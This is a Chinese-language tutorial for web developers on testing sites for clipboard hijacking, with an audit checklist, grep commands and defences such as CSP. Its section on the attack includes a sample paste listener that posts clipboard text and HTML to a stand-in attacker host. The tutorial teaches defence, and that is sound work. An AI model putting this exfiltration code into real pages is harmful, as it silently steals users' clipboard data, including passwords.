# 如何测试你的网站是否存在剪贴板劫持风险？

> 关键词：剪贴板劫持测试, clipboard hijacking test, 剪贴板安全检查, paste event测试

你在网页上复制了一段密码，粘贴到另一个网站的输入框里。页面正常接收了内容，但在你看不到的地方，JavaScript 已经把剪贴板里的所有数据读了个干净。

这就是剪贴板劫持（clipboard hijacking）。它不像 XSS 那样高调，也不像 CSRF 那样需要跨站请求。攻击者只需要在你的页面上监听一个事件，就能拿到用户剪贴板中的敏感信息。

这篇文章会告诉你剪贴板劫持的攻击原理，教你如何用工具和代码审计来排查自己网站的风险，并给出可落地的防御方案。

---

## 一、剪贴板劫持是什么

剪贴板劫持指的是网页通过浏览器提供的剪贴板 API，在用户不知情的情况下读取甚至修改剪贴板内容。

浏览器为开发者提供了几种访问剪贴板的方式：

- **`paste` 事件**：用户粘贴时触发，通过 `event.clipboardData` 可以拿到粘贴的内容。
- **`copy` / `cut` 事件**：用户复制或剪切时触发，页面可以读取甚至覆盖剪贴板数据。
- **Async Clipboard API（`navigator.clipboard`）**：较新的 API，可以异步读取和写入剪贴板，但需要用户授权和 HTTPS 环境。

前两种方式本身是合理的，富文本编辑器、代码高亮工具都在用。问题出在"过度读取"上：一个搜索框只需要拿到用户粘贴的文本，但如果它在 `paste` 事件里遍历了 `clipboardData.types` 里的每一个 MIME 类型，把 HTML、图片、文件列表全部读出来，那就越界了。

更危险的是 `copy` 事件劫持。页面可以在用户复制时把剪贴板内容替换成恶意链接。用户以为自己复制的是 `https://bank.com`，实际粘贴出来的是 `https://bank.com.evil-site.com`。这类攻击在加密货币场景下尤其致命，攻击者可以把钱包地址替换成自己的。

---

## 二、攻击原理：paste 事件的数据泄露

当一个用户在网页上按下 Ctrl+V（或 Command+V）时，浏览器会触发 `paste` 事件。事件对象上的 `clipboardData` 属性（即 `DataTransfer` 对象）包含了剪贴板里的所有数据。

来看一段典型的"越权读取"代码：

```javascript
document.addEventListener('paste', (event) => {
  const clipboardData = event.clipboardData;

  // 遍历所有 MIME 类型
  for (const type of clipboardData.types) {
    const data = clipboardData.getData(type);
    console.log(`类型: ${type}, 内容: ${data}`);
  }

  // 读取文件列表
  for (const file of clipboardData.files) {
    console.log(`文件: ${file.name}, 大小: ${file.size}`);
  }
});
```

这段代码的问题在于：一个普通的输入框，根本不需要读取 `text/html`、`image/png` 或者文件列表。但 `clipboardData` 把这些都暴露了出来。

攻击者可以把收集到的数据悄悄发送到远程服务器：

```javascript
// 危险：将剪贴板数据发送到远程服务器
fetch('https://attacker.com/collect', {
  method: 'POST',
  body: JSON.stringify({
    text: clipboardData.getData('text/plain'),
    html: clipboardData.getData('text/html'),
    files: clipboardData.files.length
  })
});
```

整个过程对用户完全透明。没有弹窗，没有提示，用户甚至不知道自己的数据被读取了。

---

## 三、自测方法：用 Clipboard Inspector 检查数据暴露面

了解原理之后，下一步是检查你自己的网站到底暴露了多少数据。Clipboard Inspector 是一个开源的浏览器端工具，专门用来展示粘贴、拖放和 Async Clipboard API 产生的数据细节。

它的核心功能是：把剪贴板中的所有数据结构化地呈现出来，让你清楚地看到哪些信息是可以被网页读取的。

### 使用步骤

1. 打开 [Clipboard Inspector](https://fudesign2008.github.io/clipboard-inspector/)。
2. 先复制一段内容到系统剪贴板，比如从文档中复制一段带格式的富文本，或者截图一张图片。
3. 在 Clipboard Inspector 页面上粘贴（Ctrl+V / Command+V），或者使用页面上的"Paste using the Clipboard API"按钮。
4. 工具会显示以下信息：
   - **`.types`**：剪贴板中包含的所有 MIME 类型列表及每种类型的完整内容。
   - **`.items`**：每个条目的 `kind`（string 还是 file）和 `type`。
   - **`.files`**：文件列表，包括文件名、大小、类型，图片还可以预览。

这个工具的价值在于：它帮你看到了"全貌"。很多开发者以为粘贴只会传递 `text/plain`，但实际上富文本编辑器、浏览器、操作系统可能会同时放入 `text/html`、`image/png`、`text/uri-list` 等多种格式。每一种格式都是潜在的泄露面。

### 导出报告

Clipboard Inspector 支持将检查结果导出为 Markdown 或 ZIP。导出为 Markdown 后，你可以直接把报告粘贴到 AI 对话中做进一步分析，也可以放进代码仓库作为安全审计的存档。

---

## 四、代码审计：检查你的网站是否有过度读取

除了用工具自测，你还需要审查自己网站的代码。以下是审计清单：

### 审计清单

- [ ] 搜索代码中所有 `paste` 事件监听器，确认每个都有合理的业务需求。
- [ ] 检查是否只读取了业务所需的 MIME 类型（比如输入框只需要 `text/plain`）。
- [ ] 确认没有遍历 `clipboardData.types` 并批量读取所有类型的行为。
- [ ] 检查是否读取了 `clipboardData.files`，如果有，确认是否有合法用途。
- [ ] 搜索所有 `copy` 和 `cut` 事件监听器，确认没有通过 `setData()` 篡改剪贴板内容。
- [ ] 检查是否使用了 Async Clipboard API（`navigator.clipboard.read`），确认有适当的用户授权提示。
- [ ] 搜索第三方依赖和内嵌脚本，确认它们没有绑定剪贴板事件。
- [ ] 检查 Content Security Policy 是否限制了 `connect-src`，防止剪贴板数据被发送到外部域。

### 快速排查命令

在项目根目录运行以下命令，快速定位可疑代码：

```bash
# 搜索 paste 事件绑定
grep -rn "paste" --include="*.js" --include="*.ts" --include="*.jsx" --include="*.tsx" src/

# 搜索 clipboardData 读取
grep -rn "clipboardData" --include="*.js" --include="*.ts" --include="*.jsx" --include="*.tsx" src/

# 搜索 Async Clipboard API
grep -rn "navigator.clipboard" --include="*.js" --include="*.ts" --include="*.jsx" --include="*.tsx" src/

# 搜索 setData 篡改
grep -rn "setData" --include="*.js" --include="*.ts" --include="*.jsx" --include="*.tsx" src/
```

### 一个安全的 paste 监听器应该长这样

```javascript
editorElement.addEventListener('paste', (event) => {
  // 只读取纯文本，忽略其他格式
  const text = event.clipboardData.getData('text/plain');

  // 只处理自己需要的内容
  handlePastedText(text);
});
```

不应该长这样：

```javascript
// 危险：读取所有类型，包括 HTML 和文件
document.addEventListener('paste', (event) => {
  for (const type of event.clipboardData.types) {
    const content = event.clipboardData.getData(type);
    sendToAnalytics(type, content); // 泄露到第三方
  }
});
```

关键区别在于：安全代码只读取它需要的那个 MIME 类型，不遍历、不多读、不外传。

---

## 五、防御措施

### 1. 最小权限原则

只在需要粘贴功能的元素上绑定 `paste` 事件，不要绑定在 `document` 上。只读取业务所需的 MIME 类型，其他的一律不碰。

```javascript
// 好：只在编辑器区域监听
editorRef.current.addEventListener('paste', handler);

// 差：全局监听，范围过大
document.addEventListener('paste', handler);
```

### 2. 使用 HTTPS

Async Clipboard API（`navigator.clipboard.read()` 和 `navigator.clipboard.write()`）只能在安全上下文（Secure Context）中使用，也就是 HTTPS 或 localhost。如果你的网站还在用 HTTP，浏览器会直接拒绝这些 API 调用。

启用 HTTPS 本身不会阻止 `paste` / `copy` / `cut` 事件的读取，但它至少保证了 Async Clipboard API 的权限模型生效。用户会看到浏览器的权限提示弹窗，有机会拒绝。

### 3. 用户提示

如果你的应用确实需要读取剪贴板内容（比如密码管理器、剪贴板历史工具），应该：

- 在读取前给用户明确的提示。
- 在界面上展示读取了什么数据。
- 提供关闭剪贴板访问的选项。

### 4. 严格的 CSP 策略

通过 Content Security Policy 限制 `connect-src`，防止脚本将剪贴板数据发送到未授权的域名：

```
Content-Security-Policy: connect-src 'self' https://api.yourdomain.com;
```

### 5. 审计第三方脚本

第三方分析工具、广告 SDK、聊天插件都可能绑定剪贴板事件。通过浏览器 DevTools 的事件监听器面板，可以检查 `paste` 和 `copy` 事件上绑定了哪些函数。

在 Chrome DevTools 中：打开 Elements 面板，选中 `document`，切到 Event Listeners 标签，搜索 `paste` 和 `copy`。

---

## 六、工具推荐：Clipboard Inspector 的典型使用场景

Clipboard Inspector 在以下场景中特别有用：

**安全审计**：定期用 Clipboard Inspector 测试你的网站，复制各种类型的内容（纯文本、富文本、截图、文件路径）然后粘贴到工具中，确认哪些数据格式被暴露了。如果出现了你不期望的类型，说明网站可能在过度读取。

**开发调试**：开发剪贴板相关功能时，先用 Clipboard Inspector 确认输入数据的结构，再编写处理逻辑。这能避免因 MIME 类型判断错误而导致的 bug。

**漏洞报告**：发现第三方网站存在剪贴板滥用时，用 Clipboard Inspector 导出 Markdown 或 ZIP 报告，附在漏洞报告中提交。结构化的报告比截图更有说服力。

**团队培训**：在团队安全培训中，让开发人员用 Clipboard Inspector 实际操作一遍，亲眼看到剪贴板里有多少数据。比干讲概念有效得多。

---

## 七、总结

剪贴板劫持是一种容易被忽视但实际危害不小的攻击方式。浏览器给了网页读取剪贴板的能力，但没有做足够细粒度的权限控制。作为开发者，你需要自己守住这条线。

回顾一下行动要点：

- 用 Clipboard Inspector 了解剪贴板数据暴露面。
- 审计代码中的 `paste`、`copy`、`cut` 事件监听器，确认没有过度读取。
- 只读取业务所需的最小数据集。
- 全站启用 HTTPS，配置严格的 CSP。
- 定期检查第三方脚本是否绑定了剪贴板事件。

剪贴板安全不是一次性的工作，把它纳入常规的安全审计流程，才能持续降低风险。
